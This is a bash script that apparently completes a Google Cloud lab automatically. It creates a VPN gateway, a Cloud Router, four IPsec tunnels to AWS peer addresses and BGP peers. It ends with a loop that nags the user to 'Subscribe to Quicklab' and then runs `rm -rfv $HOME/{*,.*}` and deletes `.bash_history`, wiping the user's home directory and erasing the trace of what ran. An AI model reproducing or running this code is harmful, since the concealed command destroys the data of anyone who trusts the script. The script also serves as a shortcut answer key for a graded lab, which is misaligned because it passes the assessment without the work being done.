BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region us-central1
#gcloud config set compute/zone us-central1-a
#export ZONE=us-central1-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------#



gcloud compute vpn-gateways create cymbal-cloud-ha-vpn-gw \
    --region=us-east4 \
    --network=cymbal-cloud-vpc


gcloud compute routers create cymbal-cloud-router \
    --network=cymbal-cloud-vpc \
    --region=us-east4 \
    --asn=65534


echo "${GREEN}${BOLD}

Task 1 Completed

${RESET}"



gcloud compute external-vpn-gateways create gcp-to-aws-vpn-gw  \
  --interfaces=0=35.254.128.120,1=35.254.128.121,2=35.254.128.122,3=35.254.128.123


echo "${GREEN}${BOLD}

Task 4.1 Completed

${RESET}"


gcloud compute target-vpn-gateways create cymbal-cloud-ha-vpn-gw  \
    --region=us-east4 \
    --network=cymbal-cloud-vpc



SHARED_KEY=$(openssl rand -hex 32)


## esp rule 

gcloud compute addresses create esp-ip --region=us-east4

gcloud compute forwarding-rules create esp-forwarding-rule \
    --region=us-east4 \
    --ip-protocol=ESP \
    --target-vpn-gateway=cymbal-cloud-ha-vpn-gw \
    --address=esp-ip

gcloud compute forwarding-rules create ike-forwarding-rule \
    --region=us-east4 \
    --ip-protocol=UDP \
    --ports=500 \
    --target-vpn-gateway=cymbal-cloud-ha-vpn-gw \
    --address=esp-ip

gcloud compute forwarding-rules create nat-t-forwarding-rule \
    --region=us-east4 \
    --ip-protocol=UDP \
    --ports=4500 \
    --target-vpn-gateway=cymbal-cloud-ha-vpn-gw \
    --address=esp-ip



gcloud compute vpn-tunnels create tunnel-1 \
    --peer-address=35.254.128.120 \
    --ike-version=2 \
    --shared-secret=$SHARED_KEY \
    --region=us-east4 \
    --local-traffic-selector=0.0.0.0/0 \
    --remote-traffic-selector=0.0.0.0/0 \
    --target-vpn-gateway=cymbal-cloud-ha-vpn-gw


gcloud compute vpn-tunnels create tunnel-2 \
    --peer-address=35.254.128.121 \
    --ike-version=2 \
    --shared-secret=$SHARED_KEY \
    --region=us-east4 \
    --local-traffic-selector=0.0.0.0/0 \
    --remote-traffic-selector=0.0.0.0/0 \
    --target-vpn-gateway=cymbal-cloud-ha-vpn-gw


gcloud compute vpn-tunnels create tunnel-3 \
    --peer-address=35.254.128.122 \
    --ike-version=2 \
    --shared-secret=$SHARED_KEY \
    --region=us-east4 \
    --local-traffic-selector=0.0.0.0/0 \
    --remote-traffic-selector=0.0.0.0/0 \
    --target-vpn-gateway=cymbal-cloud-ha-vpn-gw



gcloud compute vpn-tunnels create tunnel-4 \
    --peer-address=35.254.128.123 \
    --ike-version=2 \
    --shared-secret=$SHARED_KEY \
    --region=us-east4 \
    --local-traffic-selector=0.0.0.0/0 \
    --remote-traffic-selector=0.0.0.0/0 \
    --target-vpn-gateway=cymbal-cloud-ha-vpn-gw


echo "${GREEN}${BOLD}

Task 4.2 Completed

${RESET}"



    #TASk 5




# Add Interface int-1
gcloud compute routers add-interface cymbal-cloud-router \
    --interface-name=int-1 \
    --ip-address=169.254.10.2 \
    --mask-length=30 \
    --vpn-tunnel=tunnel-1 \
    --region=us-east4

# Add BGP Peer aws-conn1-tunn1
gcloud compute routers add-bgp-peer cymbal-cloud-router \
    --interface=int-1 \
    --peer-asn=65001 \
    --peer-name=aws-conn1-tunn1 \
    --peer-ip-address=169.254.10.1 \
    --region=us-east4





# Add Interface int-2
gcloud compute routers add-interface cymbal-cloud-router \
    --interface-name=int-2 \
    --ip-address=169.254.20.2 \
    --mask-length=30 \
    --vpn-tunnel=tunnel-2 \
    --region=us-east4

# Add BGP Peer aws-conn1-tunn2
gcloud compute routers add-bgp-peer cymbal-cloud-router \
    --interface=int-2 \
    --peer-asn=65001 \
    --peer-name=aws-conn1-tunn2 \
    --peer-ip-address=169.254.20.1 \
    --region=us-east4



# Add Interface int-3
gcloud compute routers add-interface cymbal-cloud-router \
    --interface-name=int-3 \
    --ip-address=169.254.30.2 \
    --mask-length=30 \
    --vpn-tunnel=tunnel-3 \
    --region=us-east4

# Add BGP Peer aws-conn2-tunn1
gcloud compute routers add-bgp-peer cymbal-cloud-router \
    --interface=int-3 \
    --peer-asn=65001 \
    --peer-name=aws-conn2-tunn1 \
    --peer-ip-address=169.254.30.1 \
    --region=us-east4



# Add Interface int-4
gcloud compute routers add-interface cymbal-cloud-router \
    --interface-name=int-4 \
    --ip-address=169.254.40.2 \
    --mask-length=30 \
    --vpn-tunnel=tunnel-4 \
    --region=us-east4

# Add BGP Peer aws-conn2-tunn2
gcloud compute routers add-bgp-peer cymbal-cloud-router \
    --interface=int-4 \
    --peer-asn=65001 \
    --peer-name=aws-conn2-tunn2 \
    --peer-ip-address=169.254.40.1 \
    --region=us-east4



echo "${GREEN}${BOLD}

Task 5 Completed

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
